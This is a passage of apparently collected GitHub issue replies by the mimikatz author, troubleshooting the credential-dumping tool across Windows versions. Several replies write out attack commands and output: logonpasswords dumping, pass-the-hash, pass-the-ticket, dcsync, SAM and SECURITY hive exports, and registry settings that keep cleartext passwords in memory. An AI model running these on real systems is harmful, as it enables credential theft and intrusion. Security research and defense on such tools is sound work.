{
    "gentilkiwi": "mimikatz is considered as a hacktool by some antivirus. Build it yourself, or allow it ;)\n. not a mimikatz issue, it seems your dump is not correct (full).\nalso, verify x86/x64\n. Any issue with other commands like : sekurlsa::logonpasswords ?\n. Not the only one AV I know to do that ;) - 360 Safe [cn] - http://blog.gentilkiwi.com/retro-ingenierie/360-safe-hook-noyau [fr]\n. I really hate to create a new version of ntdll.min.lib ;) - baf7785c9ee625ed1befc56fa0b9024cb3a3bef6\n. mimikatz can only show passwords, when they are in memory...\n... and by default there is none under 8.1\n. It seems you're on a x64 system, but your Python seems to be x86, so it runs a x86 PowerShell... and a x86 mimikatz.\n. You can have all modules by typing: :: , and all functions for a module by typing: module::\n. At the time of this post, latest version of ncryptprov.dll is 6.3.9600.17415, and pattern is : {0xf6, 0x43, 0x1c, 0x02, 0x75}\n. I did not test on a bunch of files, but {0x1C, 0x02, 0x75} can be enough for both version\n. you've \"ok\", it's injected.\nyou don't need to run as administrator to inject, and you can avoid \"privilege::debug\"\n. maybe make a real report ? ip / fqdn / mimikatz backlog, etc... ;) even what you try ;)\n. Hi @TopazA !\nThank for your nice idea!\nMaybe I missed something, because in version 2.0 I don't see any place where outputs are in French ?\n. hmm, well... in what ?\nmaybe some context =)\n. I'v added user32.lib to mimilove libraries, but keep in mind that Visual Studio 2008 (vc90) is required in Target Build (or ddk2003 of course)\nVisual Studio 2010, and later, don't support well targeting Windows 2000\n. Don't forget that with Visual Studio 2013... it will not work for Windows 2000 !\n. If you read Python (not like me ;)), please, take a look at @jun0s link.\nIn all case, no magical tricks in tools, all is based on:\n- https://www.gnu.org/software/shishi/manual/html_node/The-Credential-Cache-Binary-File-Format.html\n- https://tools.ietf.org/html/rfc1510#section-5.8.1\nWith a little bit of ASN.1 inside ;)\nOtherwise, you can have a look inside kekeo, especially the kirbikator project : https://github.com/gentilkiwi/kekeo/tree/master/kirbikator\nIts goal is to convert from everything, to everything... (convert, split, merge, etc... from different formats).\nMore understandable than mimikatz because kekeo uses small code dedicated to Kerberos.\n. I only mention it because of the code ;)\n. In fact this is a 'feature': https://twitter.com/gentilkiwi/status/639913689613733888\nIt helps to get scriptkiddies.\n. Hmm, it seems that with:\n- Hotfix(s):                 3 Hotfix(s) Installed.\n- ntdll: Timestamp:        Sat Sep 21 10:04:21 2013 (523D5305)\nYou did not follow my previous comment ;)\n\nand latest Windows updates\nhttps://github.com/gentilkiwi/kekeo/issues/1#issuecomment-167004313\n. Got it :)\nMy bad: I tested a specific change to Windows 10 build 10586 in the generic NT 6 tickets structures.\n- https://github.com/gentilkiwi/mimikatz/commit/1b130574ed78d1d9bf6117b0839056900cb8f816#diff-3d2c2bbb12f82d83088cbdb758f3e152\n\nIn fact, it affects all NT 6.x versions, except latest Windows 10.\nYou can fix it by removing\nDWORD       unk10586_d;\n    PVOID       unk10586_p;\nfrom the current version. I'll commit soon.\n. > Are you running as an admin user?\nYep, see 'Remark': https://github.com/gentilkiwi/mimikatz/wiki/module-~-privilege#debug\n. This is only the fast ring, not a normal one ;)\n. > Can mimikatz bypass deep freeze? that's the real question i believe ..................\n24\n. Hello !\nI don't think the problem is about wildcard (I have a cleaning routine for forbidden chars).\n0x80090011 is about object missing... here the private key.\nI don't have a lots of test with SChannel provider... but what certutil says to you when you make a test with it ?\n. As the same user with admin right (like in mimikatz) : certutil -user -store My\nAlso, you can try crypto::keys in mimikatz :)\nYou can paste mimikatz output without printscreen... it's text !\n. maybe you can try: crypto::keys /provider:MS_DEF_RSA_SCHANNEL_PROV /providertype:PROV_RSA_SCHANNEL\n. This CSP seems to be about smartcards\nNot Microsoft one for RSA, CAPI or CNG ;)\n. mimikatz isn't a hacktool.\nthere are several ways to bypass this type of protection with other tools such as PowerShell\n. Well, I'm surprised... with an up to date Windows 8.1, and current mimikatz:\n\n\n. Yep, like the diff between your lab and others computers ;)\n. Hi Oliver :)\nTo help me understand how all of that works in a ideal Metasploit/Meterpret world ; have you any clean/quick example of module for me?\nWith functions you can call, and of course with results -- but you're right... in the clean way that Meterpreter can understand :)\nThank you for your nice words, I'm pretty sure you want all Busylight colors in Meterpreter now ;)\nCheers !\n. @OJ mades all the magic!. It seems to be a SmartCard/Token certificate (not a Microsoft CSP, but a Symantec one).\nI've seen multiple times incorrect private export status when SmartCard (https://github.com/gentilkiwi/mimikatz/wiki/module-~-crypto#certificates)\nYour certutil result make me think you don't have the SmartCard/Token inserted ;)\n. So it seems to be a software one :)\nBut I know nothing about \"Symantec PKI Client CSP\", and I cannot test it, so it seems you're stuck with this non-based Microsoft CSP!\n. I'm not a developer; mimikatz isn't a software but some art.\n. A development can lead to art :)\n. Really ?\n. See the Wiki : https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#minidump (remark & errors)\n. Hi Michael,\nI think you missed it : https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth\nIt's the /run:foo\nOne \"not documented yet\" argument is /impersonate to affect the new token to the current mimikatz thread :)\n. it's: /run\"foo bar\" but arguments problem/escaping is always hard.\nOn my side a deal with argv[], so it's external to mimikatz to push it in the right way ;)\nIf I remember well, with PowerShell, you can push arguments in an array.\n. https://github.com/gentilkiwi/mimikatz/wiki/howto-~-open-an-issue#be-logic ;)\n. Amazing :)\nThank you @MichaelGrafnetter and @rmbolger !\nI even didn't know that a domain could be renamed :)\nLuckily the kull_m_rpc_drsr.h file is ready to embed the dwReplEpoch :)\ntypedef struct _DRS_EXTENSIONS_INT {\n    DWORD cb;\n    DWORD dwFlags;\n    //GUID SiteObjGuid;\n    //DWORD Pid;\n    //DWORD dwReplEpoch;\n    //DWORD dwFlagsExt;\n    //GUID ConfigObjGUID;\n    //DWORD dwExtCaps;\n} DRS_EXTENSIONS_INT, *PDRS_EXTENSIONS_INT;\nI'll take a look, maybe this week end !\n. Or we must read the all the documentation :D \n\nIf the client is a DC, it reads the value of msDS-ReplicationEpoch from its nTDSDSA object and assigns this value to the dwReplEpoch field of the DRS_EXTENSIONS_INT structure; otherwise, it sets the dwReplEpoch field of the DRS_EXTENSIONS_INT structure to zero.\n\nOn my side I tried to minimize this struct size to minimize error on input... at least we must now go to this field ;)\n. I think it will not be a problem because we must get uuidDsaObjDest from NtdsDsaObjectGuid so I presume it will be easy to get dwReplEpoch from this previous bind.\n. Damned, even MS can update its code ;)\nhttps://community.office365.com/en-us/f/156/t/172670 -> http://social.technet.microsoft.com/wiki/contents/articles/18429.dirsync-directory-sync-tool-version-release-history.aspx#AO5\n. The error code you have (0x00000002) is ERROR_FILE_NOT_FOUND... it can help you about your system store that does not exist... \"user\".\nSee: https://github.com/gentilkiwi/mimikatz/wiki/module-~-crypto#certificates\n. Thank you @goldfinger2 ! I'll try to take a look !\nI try to support LTSB and current branch, but not easy as I want it to be: laptop does not support SecureBoot, and if I enable Credential Guard on my main computer: no more VMWare :(\nIf you have some lsass.dmp from computer with errors, it'll help :)\n. Thank you @goldfinger2 .\nMicrosoft seem to search their way with LSAIso code/structures, it's not the first time at all I have to change some code like this because of their... well, you see ;)\n. Starting with 8.x and 10, by default, there is no password in memory.\nExceptions:\n- When DC is/are unreachable, the kerberos provider keeps passwords for future negocation ;\n- When HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest, UseLogonCredential (DWORD) is set to 1, the wdigest provider keeps passwords ;\n- When values in Allow* in HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Credssp\\PolicyDefaults or HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\CredentialsDelegation, the tspkgs / CredSSP provider keeps passwords.\nOf course, not when using Credential Guard.\n. Try to push users in protected users group :). As DC are \"often\" x64, there is no support for x86 versions\n. You found it :)\nofficial: yes, up to date is another story ;)\n. Skeleton key is for DC...\n. I'm sorry to see that you do not get the idea of the attack\n. It seems to have problem with this particular private key (exportable or not)\nWhat give certutil -store my and certutil -key ?\nIf confidential data, do not hesitate to mail me extra details.\n. Hi :)\nThank your for the report.\nPass-the-ticket works well (10240/10586), it relies on standard Windows API (no hack). But you can consider it does not work when using it in your current session (previous tickets, previous openned connections to servers.... already authenticated) : a \"runas /noprofile /netonly fake@fake.fake cmd\" can help you to start in a clear session without logoff/other computer ;)\n```\nMicrosoft Windows [version 10.0.10240]\n(c) 2015 Microsoft Corporation. Tous droits r\u00e9serv\u00e9s.\nC:\\Users\\Gentil Kiwi>cd Desktop\nC:\\Users\\Gentil Kiwi\\Desktop>dir \\srvcharly.nirvana.local\\c$\nLe nom d\u2019utilisateur ou le mot de passe est incorrect.\nC:\\Users\\Gentil Kiwi\\Desktop>mimikatz \"kerberos::ptt .\" exit\n.#####.   mimikatz 2.1 (x64) built on Jun  3 2016 21:39:11\n .## ^ ##.  \"A La Vie, A L'Amour\"\n ## / \\ ##  / * \n ## \\ / ##   Benjamin DELPY gentilkiwi ( benjamin@gentilkiwi.com )\n '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)\n  '#####'                                     with 19 modules *  /\nmimikatz(commandline) # kerberos::ptt .\n* Directory: '.'\n\nFile: '.\\2-40a50000-gentilkiwi@cifs~srvcharly.nirvana.local-NIRVANA.LOCAL.kirbi': OK\n\nmimikatz(commandline) # exit\nBye!\nC:\\Users\\Gentil Kiwi\\Desktop>dir \\srvcharly.nirvana.local\\c$\n Le volume dans le lecteur \\srvcharly.nirvana.local\\c$ n\u2019a pas de nom.\n Le num\u00e9ro de s\u00e9rie du volume est 561A-E004\nR\u00e9pertoire de \\srvcharly.nirvana.local\\c$\n22/08/2013  17:52              PerfLogs\n28/05/2016  12:06              Program Files\n29/03/2015  14:27              Program Files (x86)\n01/08/2015  12:53              temp\n14/09/2015  02:14              Users\n13/04/2016  03:33              Windows\n               0 fichier(s)                0 octets\n               6 R\u00e9p(s)  72\u00a0379\u00a0478\u00a0016 octets libres\nC:\\Users\\Gentil Kiwi\\Desktop>\n```\nFor Pass-the-hash in 10586, right ! I didn't backport LSAIso structure alignment of #39 to standard MSV.\nI'll try to push it tonight with another function I do.\n. >  more than just fun with flags\n\n. I get it work, you need 0x200 ;)\n. Flag validated :+1: \n\n. It could have been much more complex.\nFortunately, the structures have very compatible unions (Req v8/v10 & Rep v6/v9)\n\n. Because I don't want to give a fuck about future flags:\n- DRS_EXT_RECYCLE_BIN\n- DRS_EXT_PAM\n- ...\n\nac09c27a40082ddb400ab1525a075e316a7b9689 (pDrsExtensionsInt->dwExtCaps = MAXDWORD32)\nThank you for nice exchanges @MichaelGrafnetter & @asolino\n. it leads me to write a wiki page, no only for you, but a little bit for you :)\nhttps://github.com/gentilkiwi/mimikatz/wiki/howto-~-open-an-issue\n. You don't even post if it's x86 or x64... or send minidump...\nIn your case you can also post a zip of your lsasrv.dll file.\n. It must be OK now :)\nUS version was built 2h14m12s before the FR build, so the timestamp I compared was too recent.\nI adjusted with the US one (logically the first version built)\nThank you for your report, and full data! It's easier with all of that!\n. As it's a pre-release, I can't work on it ;)\n. That's exactly the expected behavior: https://github.com/gentilkiwi/mimikatz/wiki/module-~-standard#base64\n. If you want to have data in a file, don't use the base64 command.\n. \"installation\", \"configuration\" ? what do you mean?\nthis is a simple .exe that I provide: http://blog.gentilkiwi.com/programmes/openssl (not up to date, but amply enough)\nbut I love your way too ! :)\n. There are a lot of places where you can find OpenSSL binaries for Windows - https://wiki.openssl.org/index.php/Binaries\nNew versions of SDKs are a hell to install/download, especially when you need only few parts.\n. For kirbikator:\n- Already referenced in gentilkiwi/kekeo#2 ;) ;\n- Fixed in gentilkiwi/kekeo@e6225de .\nFor KrbCredExport, I think you can:\n- open an issue to @rvazarkar ;\n- propose him a patch to support a more generic ASN.1 .\n. https://github.com/gentilkiwi/mimikatz/wiki/module-~-standard#log ;)\n. mimikatz privilege::debug \"log U:\\results\\mimikatz.txt\" sekurlsa::logonpasswords exit\n. Sometimes, people forget that there other features than passwords-dumping in mimikatz.\nIn fact for CAPI Certificate, you can make a private key exportable with comparing to another one exportable, and a hex editor!\nMore complicated, you can backup files/registry and make all the work on another computer.\nFor antivirus debate, no: mimikatz isn't a virus or malware, but yes: you would not like to find it on your corporate computer/server :neutral_face:\nI was shocked the first when antivirus blacklisted my program (made by hand, with love :sparkling_heart:), but as mimikatz is often used \"as-is\" in real attacks, it's a logical reaction.\nAs it's not a virus/malware they are not zealous when making signature ;)\n. Hello J\u00fcrgen :)\nAnother version, another structure ;)\nThank you for dump!\nFor test purpose, what's the password of your COMPANY\\admin account?\n. Now you version is handled:\nmsv :\n         [00000003] Primary\n         * Username : admin\n         * Domain   : COMPANY\n           * unkSHA1: 9fa9aaa47e7ccb12cefb7335cabdb0a3916db926\n           * LSA Isolated Data: NtlmHash\n             Unk-Key  : f340a9f324c30a5cb636828ddb796f1f5da9b0a699c446711f5158410aceb18dfcdac753a320e26b0cb76c0d3534e23d\n             Encrypted: ac9e017840929702f22e8d05dd53f3ffaac36bb047a6cc1a7b3881fd0fa1f9061f58e6b6478220b7070eb413b9c78c2fcca37bae\n                   SS:160, TS:8, DS:52\n                   0:0x0, 1:0x64, 2:0x1, 3:0x101, 4:0x0, E:01000000000000000000000000000000, 5:0x8001\nThank you for the dump, it helped a lot!\n. Are you sure you use latest mimikatz release? ( https://github.com/gentilkiwi/mimikatz/releases/latest )\nAnd, do not forget: https://github.com/gentilkiwi/mimikatz/wiki/howto-~-open-an-issue\nOn my side:\n```\nmimikatz 2.1 (arch x64)\nWindows NT 10.0 build 14393 (arch x64)\nmsvc 150030729 207\nmimikatz # privilege::debug\nPrivilege '20' OK\nmimikatz # sekurlsa::pth /user:admin /domain:parent.local /ntlm:cc36cf7a8514893efccd332446158b1a\nuser    : admin\ndomain  : parent.local\nprogram : cmd.exe\nimpers. : no\nNTLM    : cc36cf7a8514893efccd332446158b1a\n  |  PID  4732\n  |  TID  2288\n  |  LUID 0 ; 848488 (00000000:000cf268)\n  _ msv1_0   - data copy @ 00000125275C54A0 : OK !\n  _ kerberos - data copy @ 0000012526DC42B8\n   _ aes256_hmac       -> null\n   _ aes128_hmac       -> null\n   _ rc4_hmac_nt       OK\n   _ rc4_hmac_old      OK\n   _ rc4_md4           OK\n   _ rc4_hmac_nt_exp   OK\n   _ rc4_hmac_old_exp  OK\n   _ *Password replace -> null\n``\n. Maybe a security/option product ;)\n. Amazing :)\nIt already existed with/restrictedAdmin`, a ticket without keys (without SSO).\nA flag may exist to indicate it's remote :)\nDo you have a dump on client side, and in the same time on server side ?\nCheers\n. Thank you J\u00fcrgen!\nIt can be easier if @Microsoft can buy me a Surface Book :P\n. Hello J\u00fcrgen :)\nThank you, I'll take a look :+1: \nWas the user in \"Protected Users\" group too ?\n. I don't know a lots about claims for the moment.\nI've embedded some tools in mimikatz to decrypt ticket & for PAC interpretation,.. but can not make all automated because of ASN.1 interpretation: https://social.msdn.microsoft.com/Forums/vstudio/en-US/b237c77e-614b-4c77-b9d7-9773eefb2698/berinit-and-asn1-sequence\nYou can enable \"allowtgtsessionkey\", export tgt by API and send me ticket + AES krbtgt. I can take a look.\nDo not hesitate to use mail if sensitive informations.\n. I don't understand what's your issue.\n(in fact, it looks like a question, not a issue, and I don't understand it as well)\n. \n- https://github.com/gentilkiwi/mimikatz/wiki/howto-~-open-an-issue\n- https://github.com/gentilkiwi/mimikatz/wiki/module-~-standard#log\n. I was not this year ;)\nIt seems your issue is not 10 1607 related, you'll have the same on < OS too.\n\nhttps://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump#online\n. All is possible ;)\nBut if I remember well, RegSaveKey(Ex) requires a real file on disk, even with its low level API (handle required).\nI tend to avoid that.\nBut this is exactly same as with https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump#offline ;)\n. It seems you're not a big fan of making test by yourself?\n- https://github.com/carmaa/inception/issues/127\n- https://github.com/pentestmonkey/windows-privesc-check/issues/11\n- https://github.com/xme/cuckoomx/issues/3\n. You don't remember about your own issue? #40 \n. Thanks for report and good start on precisions (see: https://github.com/gentilkiwi/mimikatz/wiki/howto-~-open-an-issue ) :)\n\nPlease, specify information on DMP source, especially age of plateform/update status.\nDon't hesitate to send me the DMP.\n. You can try to use mimilib in WinDBG x64.\n. Can you send me the result of: uf lsasrv!WLsaEnumerateLogonSession ?\nIt's only function code, no data inside.\n. Is there any address where I can send you a private build for you to test ? :)\n. use an UNICODE font like Lucida/Consolas\n. Hello,\nInteresting behavior. It seems to hang before any hash/credential injection.\nFirst operation is to create another process with CreateProcessWithLogonW, then print PID/TID.\nMaybe a security product on the computer (https://github.com/gentilkiwi/mimikatz/wiki/howto-~-open-an-issue#check-you-dont-have-a-paranoid-security-product)\n. Hello,\nI invite you to consult https://github.com/gentilkiwi/mimikatz/wiki/howto-~-open-an-issue and to give a little bit more informations :)\n. Especially this part: https://github.com/gentilkiwi/mimikatz/wiki/howto-~-open-an-issue#check-you-dont-have-a-paranoid-security-product ;)\nTry it in a clean VM by example.\n. Hello,\nI invite you to use the latest mimikatz release, and to post as much you can informations indicated in https://github.com/gentilkiwi/mimikatz/wiki/howto-~-open-an-issue\n. Hello :)\nI invite you to take a look at https://github.com/gentilkiwi/mimikatz/wiki/howto-~-open-an-issue#be-logic (Be Logic) part\n. Hi Daniel,\nI think I've missed this issue !\nI already seen such behavior with SmartCard CSPs:\n- https://github.com/gentilkiwi/mimikatz/wiki/howto-~-open-an-issue#be-logic\n- https://github.com/gentilkiwi/mimikatz/wiki/module-~-crypto#certificates (remarks part)\nOf course, a software patch cannot modify a smartcard behavior ;)\n- https://github.com/gentilkiwi/mimikatz/wiki/module-~-crypto#capi\nThis patch only deal with standard RSA CSP :)\nYou can check standard export test with the certutil -user -exportpfx ... command.\nBy the way:\n- privilege::debug isn't needed for CAPI patch (only for CNG)\n- /systemstor is misspelled, it's /systemstore (and you don't need it for CURRENT_USER)\n- /store:my isn't needed, My is the default one ;)\n. It really looks like your:\n- certificate_steal.cpp is from @geffner excellent code/research exportable_rsa_keys.pdf...\n- certificate_export.cpp is from @idrassi cool sample CAPI_KEYGEN.cpp\nThese two codes have two different objectives and functioning.\nI encourage you at first to understand the normal behavior of CAPI_KEYGEN.cpp then  exportable_rsa_keys.pdf.\n. I agree for 2010 :) I can recommend you to use 2012 :)\nUnfortunately, VS 2008 is not compatible with XML project trick I use.. Hi,\nMy answer was too long, so I made a little post: https://github.com/gentilkiwi/mimikatz/wiki/howto-~-scheduled-tasks-credentials !. I doubt this can be the binary form of a password.\nSo, please, can you give enough informations? (like in: https://github.com/gentilkiwi/mimikatz/wiki/howto-~-open-an-issue). Take a look at this part: https://github.com/gentilkiwi/mimikatz/wiki/howto-~-open-an-issue#paste-the-full-log-file ;). Did you read: https://github.com/gentilkiwi/mimikatz#build ?. cautiously. Hello,\nCan you please be more explicit ? :) (see: https://github.com/gentilkiwi/mimikatz/wiki/howto-~-open-an-issue ). There is a lots of chance that this kind of private keys are not CNG (you can check by listing them).\nkull_m_patch (0x00000000) indicate that pattern cannot be found: usually because service already patched.\nA lots of info are missing to help (see wiki page). . Offline mode is not broken... Wiki is ;)\nYou must use: /system:<your SYSTEM hive> and /sam:<your SAM hive>. wow, certainly one of the worst 'issue' declaration I had to read...\n- [x] LTSB 2015 10240 x86 pre March update\n- [x] LTSB 2015 10240 x64 pre March update\n- [x] LTSB 2016 x86 pre March update\n- [x] LTSB 2016 x64 pre March update\nAnd after update:\n- [x] LTSB 2015 10240 x86 post March update\n- [x] LTSB 2015 10240 x64 post March update\n- [x] LTSB 2016 x86 post March update\n- [x] LTSB 2016 x64 post March update\nIn all cases, no data in mimikatz TsPkg part... and it's normal, see #40\nStructures (and passwords) now appear in TsPkg part when you enable Credentials Delegation\nAlso tested after enabled Credentials Delegation:\n- [x] LTSB 2015 10240 x86 post March update\n- [x] LTSB 2015 10240 x64 post March update\n- [x] LTSB 2016 x86 post March update\n- [x] LTSB 2016 x64 post March update\nPasswords are here. Hi Daniel,\nThank you for the report.\nBecause of some RPC stuff, I was ending the process too soon to let PowerShell knows about the result.\nIt will be back soon ;) (already fixed but I've other stuff to push ;))\n```\nWindows PowerShell\nCopyright (C) 2016 Microsoft Corporation. Tous droits r\u00e9serv\u00e9s.\nPS C:\\Users\\gentilkiwi> Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force\nPS C:\\Users\\gentilkiwi> . .\\Desktop\\Invoke-Mimikatz.ps1\nPS C:\\Users\\gentilkiwi> Invoke-Mimikatz -Command version\n.#####.   mimikatz 2.1.1 (x64) built on Mar 25 2017 14:01:06\n .## ^ ##.  \"A La Vie, A L'Amour\"\n ## / \\ ##  / * \n ## \\ / ##   Benjamin DELPY gentilkiwi ( benjamin@gentilkiwi.com )\n '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)\n  '#####'                                     with 21 modules *  /\nmimikatz(powershell) # version\nmimikatz 2.1.1 (arch x64)\nWindows NT 10.0 build 14393 (arch x64)\nmsvc 150030729 207\n``. It seems thatUnk-keyis a subkey encrypted byLsaIsoin VSM needed to decryptEncrypteddata (NTLM hash among others). A.bat` file? Really?\nIf you are admin (you seems to be because of the DEBUG privilege) but you can't access LSASS process (5 = access denied), a lots of chances:\n- LSASS is running as a protected process ;\n- A security product prevent your access.. I can confirm you that Avast, among others products, is not fully disabled when you disable it.. I'm only saying what's the product's behavior. But you do what you want :). Or use an unicode font in the console ;) (like Consolas or Courier New). Use a font like Courier New\n\nof course, it's mixed with reverse order ;). Results don't vary, a byte is a byte.\nWindows console is not a perfect model when handling international chars.\nAll Windows fonts are not able to render output in hebrew.\nEspecially when using UNICODE encoding (and not OEM).. Fixed in Wiki :). Hello :)\nMaybe take a look at: https://github.com/gentilkiwi/mimikatz/wiki/howto-~-open-an-issue#check-you-use-latest-mimikatz-version\nAnd try first with an original version of mimikatz ;). I need more information ;) as mentionned in the previous link.\nFYI, I use an up to date Windows 10 CU and mimikatz works like a charm on it.. Hmm, just tested with an up to date 8.1 x86 ... (check: version /full)\n. I rarely support fresh Windows install without any update (not the real life env.)\nSayak, can you post: version /full. https://github.com/gentilkiwi/mimikatz/issues/87. Hmm, I don't see the issue in your message. Do not forget about full output (privilege::debug not on your screenshot), and to deal with your security products.... I maybe forgot some local character in C files. Do not hesitates to remove it to be able to compile.. J'ai jet\u00e9 un coup d\u2019\u0153il, cela \u00e0 l'air correcte ;)\nAu pire, je corrigerais quelques trucs, mais je prend ton code as-is.. Hello :)\nI never saw this kind of revision. Do not hesitate to send me file to reproduce !\nhttps://github.com/gentilkiwi/mimikatz/wiki/howto-~-open-an-issue#give-me-files. In fact, this is a problem in the klist client ;) It does not handle very well its own Microsoft Kerberos API when there is some data missing in the structure.\nHere, the KDC called... but it is of course not present in a normal Keberos ticket transport structure.\nGenerated by mimikatz or not, a \"kirbi\" file will be problematic (sometimes) with klist.\nThat's why I made a \"kerberos::list\" command too :). I'm sorry to have missed your message (you've full access to my PM you know!) - there are option in registry to override KDC (and some LDAP req/discovery).\nBut usualy the problem is DNS, DNS & DNS ;). More information on this little thread: https://twitter.com/gentilkiwi/status/911986789010862080. 0xc0000022 is \"Access Denied\".\nMaybe your privilege::debug was not successful, maybe a security product is here, maybe LSA is on a protected process mode...\nIn all case, maybe think about using: lsadump::dcsync instead ;). What a bad text format ;) do not hesitate to send full input / output, but:\n\nprivilege::debug is missing here\ni don't really work on preview.. See remarks of: https://github.com/gentilkiwi/mimikatz/wiki/module-~-crypto#certificates ;). Hello,\n\nThis is not unwanted ;) The key of this API is the ability to change user password without knowing its password : only its NTLM hash / RC4 key.\nIt uses legacy API that does not deal with cleartext passwords, neither AES keys.\nOther API are here if you want to deal with passwords :). Please, take a look: https://github.com/gentilkiwi/mimikatz/wiki/howto-~-open-an-issue. TargetName is not a \"KRB-CRED\" field. I only display it because it was populated in memory by LSASS.\nIt's exactly like the \"missing\" KDC called field with klist.\nIn all cases, it's not needed at all to make it works :). mimikatz hardly relies on Windows subsystem... not sure Wine emulate all the necessary.\nWe are in 2018, I can't think security teams don't use a VM for all the Windows good stuff :). Hi :)\nFirst, thank you for the meme \\o/\nThen:\n- dpapi::masterkey is for masterkeys (%appdata%\\Microsoft\\Protect) ;\n- dpapi::cred is for credentials files (%localappdata% / %appdata% \\Microsoft\\Credentials).\nIt's quick and dirty parsers, so I don't detect when format is not correct ;) (and my doc sucks ;))\nYou can view cache content with: dpapi::cache to be sure what keys are in cache or not :). Are you sure the scheduled task is configured to run as another user ?\nOr maybe \"only localy\" (password does not need to be stored): schtasks /query /tn $kiwi /xml\nRun as another user, but no password stored:\n<Principals>\n    <Principal id=\"Author\">\n      <UserId>S-1-5-21-a-b-c-xxxx</UserId>\n      <LogonType>S4U</LogonType>\n    </Principal>\nRun as another user, with password stored (can interact on the network):\n<Principals>\n    <Principal id=\"Author\">\n      <UserId>S-1-5-21-a-b-c-xxxx</UserId>\n      <LogonType>Password</LogonType>\n    </Principal>\nIn all cases, you can check a credential is stored by using vault cmd: vault::cred, after elevating as SYSTEM. Hmm, maybe you can work on your PowerShell script ?\nIt's not mimikatz related.... \nhttps://github.com/gentilkiwi/mimikatz/wiki/howto-~-open-an-issue#check-you-dont-have-a-paranoid-security-product. In fact, you can write numbers in a lots of different ways. When using basic Windows API (not the real ASN1 encoder), it uses long format for number.\nNot efficient, but not incorrect :). It seems recents Visual Studio don't embed fltlib.lib.\nYou can get it from others installation (and push it in the correct lib directory of mimikatz)\nWill (maybe) push it tonight :). Haha, thank you, but support is free ;) ;). Duplicate with #118 and fixed in 78dba4ede9f70d05872a07717314f3253e0b7f61. I wish you good luck at trying to decrypt hashes ;). Windows 8 still used ? :). I think I did not check against a 1607 (only 1709 previous time). You're right, I think I'll remove = separator... it was not really designed to be used.. I encourage you take a look at the Wiki, especially on the first part: https://github.com/gentilkiwi/mimikatz/wiki/howto-~-open-an-issue#check-you-use-latest-mimikatz-version. I don't play with insiders builds as it's not used IRL in enterprises.\nLatest supported is Windows NT 10.0 build 16299 (the 1709 one). Thank you all. Did you get errors on Windows 10 too?\nWill try to reproduce it on my side, especially with another compiler than WinDDK. \n. Ask to whitelist it ;). yep, I usually avoid touching Git stuff for simple modification, cause I use SVN behind. On a DC, you can try to use sekurlsa::krbtgt. Maybe more output ? ;)\n``\n  .#####.   mimikatz 2.1.1 (x64) built on Feb  8 2018 00:17:53\n .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n ## / \\ ##  /*** Benjamin DELPYgentilkiwi` ( benjamin@gentilkiwi.com )\n ## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/\nmimikatz # privilege::debug\nPrivilege '20' OK\nmimikatz # sekurlsa::pth /user:a /domain:b /ntlm:00112233445566778899aabbccddeeff\nuser    : a\ndomain  : b\nprogram : cmd.exe\nimpers. : no\nNTLM    : 00112233445566778899aabbccddeeff\n  |  PID  296\n  |  TID  1028\n  |  LSA Process is now R/W\n  |  LUID 0 ; 4940824 (00000000:004b6418)\n  _ msv1_0   - data copy @ 0000000000465E90 : OK !\n  _ kerberos - data copy @ 000000000044C6E8\n   _ aes256_hmac       -> null\n   _ aes128_hmac       -> null\n   _ rc4_hmac_nt       OK\n   _ rc4_hmac_old      OK\n   _ rc4_md4           OK\n   _ rc4_hmac_nt_exp   OK\n   _ rc4_hmac_old_exp  OK\n   _ *Password replace -> null\nmimikatz # version /full\nmimikatz 2.1.1 (arch x64)\nWindows NT 6.1 build 7601 (arch x64)\nmsvc 150030729 207\nlsasrv.dll      : 6.1.7601.23915\nmsv1_0.dll      : 6.1.7601.23915\ntspkg.dll       : 6.1.7601.23915\nwdigest.dll     : 6.1.7601.23915\nkerberos.dll    : 6.1.7601.23915\ncryptdll.dll    : 6.1.7600.16385\nsamsrv.dll      : 6.1.7601.23677\nrsaenh.dll      : 6.1.7600.16385\nncrypt.dll      : 6.1.7601.23915\nwevtsvc.dll     : 6.1.7601.17514\ntermsrv.dll     : 6.1.7601.18637\nmimikatz #\n```\nSome security product can also prevent mimikatz to alter remote memory, then terminate it.. I recommend you to test by yourself, or to search?\n\nhttps://github.com/gentilkiwi/mimikatz/search?q=kerberos+pin\nhttps://github.com/gentilkiwi/mimikatz/wiki. Thank you :)\nI admit I did not make a lots of test on new versions of Windows Server, cause I use a Windows 7 x64 as \"hackmachine\" ;)\nCan you please run: version /full /cab and post output / file (only public files). Thank you :)\nBut please, can you upload cab files ;). Usually in the mimikatz current directory (type cd in mimikatz to get it). Please, take a look to the latest update :)\nhttps://github.com/gentilkiwi/mimikatz/releases. I let you read about RtlIpv6AddressToString et RtlIpv4AddressToString. I don't check for this privilege. What make you think that?\nMaybe a Windows API can check that (some process helper check for Debug by eg.). Hm?\nMaybe more help for me :) https://github.com/gentilkiwi/mimikatz/wiki/howto-~-open-an-issue. Please take a look at: https://github.com/gentilkiwi/mimikatz/issues/40#issuecomment-220830921\n(and be more prolific in issue title, mimikatz is not about passwords only ;)). You're right :)\nIn fact, it will cache it on first successfull decryption. But I will push the idea on my todo list :). > The silver ticket is generated from the hash of the password of an admin account using kerberoasting.\n\nPlease, de not mix things not related... Golden or Silver ticket are not related to user accounts (for Silver, it can be only in particular cases, but not for the LDAP service of a DC...). Never seen this kind of error.\nCan you send:\nversion /full /cab\nAnd a backup of registry files, as Admin (even privately if a not a test machine):\nreg save HKLM\\SYSTEM SystemBkup.hiv\nreg save HKLM\\SAM SamBkup.hiv\nreg save HKLM\\SECURITY SecBkup.hiv. Never seen a one like this :)\nOn my 1803, no reference at all to this.\n\nSeems to be related to account in the cloud, there is a lots of chance the password is DPAPI protected somewhere or in registry as a 